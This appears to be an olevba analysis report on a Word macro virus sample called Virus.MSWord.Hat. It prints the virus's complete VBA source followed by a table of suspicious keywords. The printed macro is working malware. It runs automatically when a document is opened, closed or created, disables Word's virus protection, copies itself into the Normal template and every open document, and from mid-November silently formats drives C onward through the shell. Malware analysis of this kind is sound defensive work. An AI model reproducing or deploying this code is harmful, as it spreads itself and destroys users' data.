olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hat
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hat - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Hate_123456'
Dim N As Object
Set N = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set A = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
On Error Resume Next
Application.Options.VirusProtection = False
If N.Lines(2, 1) <> "'Hate_123456'" Then
    N.DeleteLines 1, N.CountOfLines
End If
If N.CountOfLines = 0 Then
    N.InsertLines 1, A.Lines(1, A.CountOfLines)
End If
If NormalTemplate.Saved = False Then NormalTemplate.Save
For k = 1 To Application.Documents.Count
Set A = Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule
If A.Lines(2, 1) <> "Hate_123456" Then
    A.DeleteLines 1, A.CountOfLines
End If
If A.CountOfLines = 0 Then
    A.InsertLines 1, N.Lines(1, N.CountOfLines)
End If
Next k
If (Day(Now()) >= 16) And (Month(Now()) >= 11) Then
If Dir("c:\vir.txt") <> "" Then Exit Sub
For k = 1 To 20
    sCmd$ = "echo y|format " & Chr(66 + k) & ":" & " /u"
    Shell Environ$("COMSPEC") + " /c " + sCmd$, 0
Next
End If
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

